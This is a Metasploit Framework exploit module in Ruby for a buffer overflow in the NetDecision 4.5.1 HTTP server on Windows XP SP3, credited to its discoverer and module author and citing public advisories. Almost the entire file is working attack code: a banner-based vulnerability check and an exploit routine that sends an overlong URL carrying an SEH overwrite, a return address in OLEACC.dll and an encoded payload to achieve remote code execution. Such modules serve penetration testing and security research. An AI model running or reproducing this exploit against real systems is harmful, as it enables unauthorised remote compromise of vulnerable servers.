##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::HttpClient

	def initialize(info={})
		super(update_info(info,
			'Name'           => "NetDecision 4.5.1 HTTP Server Buffer Overflow",
			'Description'    => %q{
					This module exploits a vulnerability found in NetDecision's HTTP service
				(located in C:\Program Files\NetDecision\Bin\HttpSvr.exe).  By supplying a
				long string of data to the URL, an overflow may occur if the data gets handled
				by HTTP Server's active window.  In other words, in order to gain remote code
				execution, the victim is probably looking at HttpSvr's window.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'Prabhu S Angadi',  #Discovery, DoS PoC
					'sinn3r'            #Metasploit
				],
			'References'     =>
				[
					['OSVDB', '79651'],
					['URL', 'http://secunia.com/advisories/48168/'],
					['URL', 'http://secpod.org/advisories/SecPod_Netmechanica_NetDecision_HTTP_Server_DoS_Vuln.txt']
				],
			'Payload'        =>
				{
					'BadChars' => "\x00\x09\x0a\x0d\x20\x25\x26\x27\x3f",
					'StackAdjustment' => -3500,
				},
			'DefaultOptions'  =>
				{
					'ExitFunction' => "seh",
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[
						'NetDecision 4.5.1 on XP SP3',
						{
							# POP/POP/RET - OLEACC.dll
							'Ret'    => 0x74C869E2,
							'Offset' => 1620
						}
					],
				],
			'Privileged'     => false,
			'DisclosureDate' => "Feb 24 2012",
			'DefaultTarget'  => 0))
	end

	def check
		res = send_request_cgi({'uri'=>'/'})
		banner = res.headers['Server']
		if banner =~ /NetDecision\-HTTP\-Server\/1\.0/
			return Exploit::CheckCode::Vulnerable
		else
			return Exploit::CheckCode::Safe
		end
	end

	def exploit
		buf = "/"
		buf << rand_text_alpha(675, payload_badchars)
		buf << pattern_create(5) #Avoid TerminateProcess()
		buf << rand_text_alpha(target['Offset']-buf.length, payload_badchars)
		buf << "\xeb\x06" + rand_text_alpha(2, payload_badchars)
		buf << [target.ret].pack('V*')
		buf << payload.encoded
		buf << rand_text_alpha(8000-buf.length, payload_badchars)

		print_status("#{rhost}:#{rport} - Sending #{self.name}...")

		send_request_raw({
			'method' => 'GET',
			'uri'    => buf
		})

		handler
	end
end